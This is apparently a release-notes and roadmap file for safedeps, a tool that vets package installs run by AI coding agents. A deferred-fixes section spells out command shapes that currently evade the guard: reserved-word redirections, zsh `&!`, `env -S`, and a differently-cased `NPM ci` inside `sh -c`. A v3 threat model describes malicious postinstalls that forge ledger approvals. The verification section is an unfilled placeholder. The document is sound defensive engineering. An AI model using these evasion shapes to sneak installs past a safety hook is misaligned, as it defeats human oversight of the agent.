These are `scripts/measure/scan-cost.sh --reps 3` on the release tree, 2026-10-04, best of three: macOS on an M1 MacBook (load 1.1 to 4.6), Linux on the project's Debian VM (load 0.8 to 0.9). A number from another machine or another tree is not this one.

### Linux and CI

The ubuntu CI job had been red since 2026-08-04, and the macOS job was green, so four Linux-only defects hid behind the first one:

- The self-budget battery sized its inputs by how slow the scan was, which the linear scanner and a faster runner both undid. It now holds the judgment up with an `awk` placed first on `PATH`, and starts the guard with `TERM` ignored so only the `KILL` escalation can answer on time. That the battery had been passing without exercising the escalation was found by mutation.
- Linux refuses a single environment string over 128KB, so the 500,000-character budget case never launched the guard, and the harness read the launch failure as `pass`.
- The advisory log's stale-lock check asked BSD `stat -f` first, which on Linux prints filesystem information and exits 0; the arithmetic then died under `set -u`.
- The ledger index printed entries twice when one ledger file was broken, depending on the filesystem's directory order.

### Also in this release

- **The advisory log is bounded by compaction** instead of growing forever. Evidence lines, which `re-check` reads to tell a real approval from a forged one, are kept whole; trace lines are archived and pruned.
- **Global npm approvals are project-independent.** An approved global install is no longer denied because the session sits in a project with `overrides`.

### Moved to v2.18.1

Review found more than one release could close, and these were stated rather than rushed:

- **Where a command starts in the lexer.** A command glued to a reserved word or `!` through a redirection (`if true; then>/dev/null pip install …`), zsh's `&!`, and `env -S` strings read as shell are still read as no command. Each predates this release; v2.18.1 takes the design judgment review asked for.
- **Records tied to the call.** Install records are found by directory and command, so two overlapping calls of one command can use each other's record, and a backstop entry whose key does not match sends its call to the records. Both engines send the same `tool_use_id` to both hooks, and v2.18.1 keys every record by it.
- **Failed tool calls.** Claude Code runs PostToolUseFailure, not PostToolUse, for a failed call, and safedeps does not register it, so a failed install is not verified and leaves its record behind.
- **An npm spelled in another case inside a script handed to a shell.** In `npm install x; sh -c "… && NPM ci"` the visible install gets the flag, and the hidden `NPM ci` runs its scripts with no record, as in v2.17.2 and main. Reading that name in any case today would drop the visible install's rewrite too, so it waits for a placement design that keeps both.
- **The Codex registry warning** says "(on Codex it cannot)" after "did not add" on either engine.

### Verification

VERIFICATION_PARAGRAPH

## v3 (future)

### Ledger tamper resistance

Defends the second-order attack where a malicious package's `postinstall` (running as the user) forges a "B approved" ledger entry so a later install of B skips the advisory check. The package cannot do this *before* it runs, so closing the install-time gate is the first line of defense; this hardens the case where a first compromise already happened.

Approach — **treat OSV as the authority and the ledger as a cache**, plus tamper detection. Cheap, layers onto existing infra:

1. **Re-validate at enforcement / re-check** — verify the stored evidence against OSV instead of trusting the ledger verdict. A forged entry with no real evidence (or for a package OSV reports as vulnerable) is caught and revoked. Reduces the ledger to memoization with OSV as SSoT. *(Still open — per-install network cost tradeoff.)*
2. **Watch `~/.safedeps/` in the post-install scan** — shipped: the post-verify sensitive-path scan flags install scripts touching `~/.safedeps` / `SAFEDEPS_HOME`, so a package that writes the ledger trips a reorg — catching the forge in the act (smoke: ledger-tamper fixture).
3. **Provenance cross-check in daily re-check** — shipped: `re-check` flags ledger entries with no matching `advisory.log` record as `suspected_forgery` (not revoked), and as of v2.9.2 the daily alert wrapper surfaces the flag.

Explicit non-approach: **cryptographic ledger signing is not pursued** — a same-uid attacker can read the signing key and re-sign forgeries, so a local HMAC/signature adds no real boundary. The defense is authority-elsewhere (OSV) + detection, not local secrets.

### Other v3 work

- **Plugin providers** — user-defined advisory sources (internal vuln DB, private registry).
- **Policy file** — `.safedeps.toml` for team policy (auto-block on KEV hit, user confirm on CVSS 7+, per-package allowlist).
- **CI mode** — `safedeps check --ci` for fail-fast in GitHub Actions / CircleCI.
- **Closure expansion beyond npm** — pip / cargo / go / gem / maven / nuget closure resolvers with explicit no-script/no-build policies.
- **Transitive risk score** — deps.dev graph integration; risk visualization beyond direct dependencies.

## v4+ (long-term)

- **Team-shared ledger** — multi-machine approved-spec sync.
- **Agent remediation** — Claude / Codex suggests a safer replacement when a vuln is found (LLM-as-judge).
- **Diff visualization** — dependency-tree diff between two approved-spec snapshots.

---

## History

- 2026-05-18: Initial ROADMAP — v1 → v2 decision plus v3 / v4 outline.
